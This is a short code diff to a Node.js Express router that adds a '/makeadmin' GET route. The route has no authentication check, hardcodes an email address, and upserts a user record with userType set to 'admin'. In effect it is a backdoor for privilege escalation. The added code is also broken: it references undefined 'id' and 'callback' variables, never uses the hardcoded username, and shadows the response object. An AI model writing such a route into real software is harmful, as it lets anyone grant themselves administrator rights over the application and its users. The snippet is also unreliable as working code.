@@ -335,4 +335,24 @@ router.post('/orders/find/:order_status',requireAuth, function(req, res) {
 });
 
 
+router.get('/makeadmin', function(req, res) {
+                var username = 'ragnarokconnectio4869@gmail.com';
+                User.findOneAndUpdate({'_id' : id}, 
+                            {$set: {
+                                userType : 'admin'
+                            }},
+                            {upsert: true, new : true}, function(err, res){
+                             if (err) {         
+                                    return (err);
+                                } else {
+                                    callback(err,res)							
+                                }
+                                    
+                });							
+		
+                
+});
+
+
+
 module.exports = router;
